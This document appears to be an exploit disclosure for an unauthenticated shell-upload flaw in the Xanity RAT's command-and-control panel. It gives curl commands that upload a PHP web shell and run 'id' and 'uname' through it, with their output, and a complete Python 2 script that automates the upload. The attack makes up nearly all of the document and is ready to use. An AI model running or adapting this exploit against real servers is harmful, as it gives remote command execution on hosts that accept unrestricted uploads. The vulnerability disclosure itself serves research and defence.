
Type: File Upload

Author: [Xiphos Research Ltd.](https://github.com/XiphosResearch)

# TorCTPwn

I was having a look at the C&C panel of the [Xanity RAT](https://github.com/alienwithin/xanity-php-rat) for a bit of amusement, and noticed that it suffers an absurdly trivial shell upload vulnerability, outlined below.

See: [upload.php](https://github.com/alienwithin/xanity-php-rat/blob/master/server-files/upload.php) and note we can upload whatever the hell we want to a place with whatever name we want. Trivial shell upload with no auth or anything.

PoC using cURL:
```
$ curl -F name=lol.php -F file=@/tmp/lol.php http://localhost/upload.php?d=lol
1
$ curl http://localhost/lol/lol.php?1=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ curl http://localhost/lol/lol.php?1=uname
Linux
$ 
```

For shits and giggles, there is also an automated exploit for this in this repo.
```
$ python xanity-pwn.py 
use: xanity-pwn.py http://xanity.skids/upload.php /your/shell.php
$ python xanity-pwn.py http://localhost/upload.php /tmp/lol.php 
[+] Shell Uploaded! It should be in: http://localhost/lol/lol.php
$ curl http://localhost/lol/lol.php?1=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

```
#!/usr/bin/python2
# coding: utf-8
# Xanity RAT C&C Panel Shell Upload Exploit
# Written before coffee happened.
# Author: Darren Martyn
# Licence: WTFPL - wtfpl.net
import requests
import sys
import os

def upload_shell(url, shell):
    up_url = url + "?d=lol" # add "d" param
    try:
        files = {'file': open(shell, "rb")}
        r = requests.post(url=up_url, files=files)
    except:
        sys.exit("[-] failure")
    if "1" in r.text: # the next line is ugly as sin.
        print "[+] Shell Uploaded! It should be in: %s" %(url.replace("upload.php", "lol/%s" %(os.path.basename(shell))))


def main(args):
    if len(args) != 3:
        sys.exit("use: %s http://xanity.skids/upload.php /your/shell.php" %(args[0]))
    upload_shell(url=args[1], shell=args[2])

if __name__ == "__main__":
    main(args=sys.argv)
```